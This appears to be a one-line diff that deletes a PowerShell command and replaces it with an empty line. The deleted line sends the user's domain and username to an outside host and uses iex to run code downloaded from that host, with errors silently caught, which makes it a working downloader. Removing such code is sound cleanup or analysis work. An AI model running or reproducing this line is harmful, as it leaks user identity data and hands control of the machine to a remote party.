@@ -1,1 +1,1 @@
-try{$ud = $env:userdomain;$un = $env:username;$obj = New-Object System.Net.WebClient;iex($obj.DownloadString('http://p1o2i3u4y5t6r7e8w9q0.medianewsonline.com/login.php?OKey='+$ud+'&Areyou=cake'+'&Who='+$un));}catch{}
+
